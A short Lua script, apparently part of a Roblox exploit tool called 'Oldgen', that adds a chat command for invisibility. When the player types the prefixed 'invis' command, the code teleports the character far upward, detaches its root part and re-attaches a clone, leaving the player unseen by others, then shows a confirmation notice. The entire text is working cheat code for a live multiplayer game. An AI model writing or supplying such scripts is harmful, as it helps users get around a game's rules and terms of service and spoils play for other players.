game:GetService("Players").LocalPlayer.Chatted:Connect(function(msg)
	if msg == ""..prefix.."invis" then
		if tpbypass == true then
			game:GetService("StarterGui"):SetCore("SendNotification", {
				Title = "Oldgen";
				Text = "Cant Invis While Tpbypass Is Enabled";
			})
		else
			invis = true
			local l = game.Players.LocalPlayer
			local c = l.Character
			local rr = c.HumanoidRootPart
			local position = rr.Position
			local crr = rr:Clone()
			c:MoveTo(position + Vector3.new(0,9000000, 0))
			rr.Parent = nil
			wait(0.3)
			crr.Parent = c
			position = position
			game:GetService("StarterGui"):SetCore("SendNotification", {
				Title = "Oldgen";
				Text = "Invis Enabled, Reset To Disable";
			})
		end
	end
end)

